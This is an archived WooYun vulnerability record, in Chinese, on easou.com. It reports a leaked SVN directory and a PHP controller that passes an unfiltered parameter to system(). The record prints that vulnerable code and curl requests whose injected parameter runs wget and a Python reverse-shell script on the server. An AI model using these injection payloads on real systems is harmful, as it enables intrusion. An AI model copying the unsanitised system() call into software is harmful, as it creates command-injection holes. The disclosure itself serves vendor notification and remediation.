{"id": 47180, "wybug_id": "wooyun-2014-087818", "wybug_title": "宜搜某分站配置不当已被getshell", "wybug_corp": "easou.com", "wybug_author": "米兰的小铁匠", "wybug_date": "2014-12-19 14:51", "wybug_open_date": "2015-02-02 14:52", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向公众公开  简要描述： 某神器扫描到。。。 详细说明：  某神器扫描到 svn地址泄露http://wall.easou.com/.svn/entries直接下载源码， 基于yii框架，文件/protected/controllers/ProController.php\n//开发者后台sdk下载（可以改包名）    public function actionGetPackageName2()    {        $packageName='';        $SDKType='';        //   $url_base='http://winads.cn:80';        if(isset($_GET['packageName']))$packageName=$_GET['packageName'];        if(isset($_GET['SDKType']))$SDKType=$_GET['SDKType'];        //报名前缀        $filename_list=array(1=>'banner-',2=>'adwall-',3=>'offers-',4=>'alert-',5=>'push-');        $filename=$filename_list[$SDKType].time();        $aid=1;//代理号        //  $command_str=\"/var/lib/jdk1.6.0_22/bin/java -jar /home/ledian/autosdk.jar {$packageName} {$SDKType} {$aid} {$filename}\";        // $aa = exec(\"/usr/bin/id\");        // $bb = system($command_str);        // var_dump($aa);        // var_dump($bb);        // system(\"/home/ledian/autopack.sh {$packageName} {$SDKType} {$aid} {$filename}\");        system(\"/var/www/xyz/site/autopack.sh {$packageName} {$SDKType} {$aid} {$filename}\");        $url='http://sdkdown.winads.cn/sdkoutPack/'.$filename.'.zip';//sdkoutPack        echo '{\"state\":\"OK\",\"url\":\"'.$url.'\"}';        exit;    }\n额 system函数未过滤，导致命令注入，直接反弹shellcurl \"http://wall.easou.com/index.php?r=pro/getpackagename2&packageName=| wget -O xxx |\"curl \"http://wall.easou.com/index.php?r=pro/getpackagename2&packageName=| python /tmp/test.py xxx xxx |\"见漏洞证明吧   漏洞证明：  额，直接反弹shell，反弹shell程序在/tmp/test.py 请自行删除在机器 /etc/nginx/sites-enabled ls结果如下：麻烦自行检测确认\n\n   修复方案：  修复命令执行，修复svn泄露   版权声明：转载请注明来源 米兰的小铁匠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-19 14:59 厂商回复： 谢谢指出，我们会及时改正 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-19 14:56 |    \t\tazuer \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:30        )\t\t \n  ！求神器！    \n     2014-12-19 15:20 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  ！求神器！    \n     2015-01-10 16:28 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  ！求神器！    \n     2015-01-11 13:01 |    \t\t淡蓝色の忧伤 \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:26        | 开启审计php代码模式      (⊙v⊙)嗯)\t\t \n  ！求神器！     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}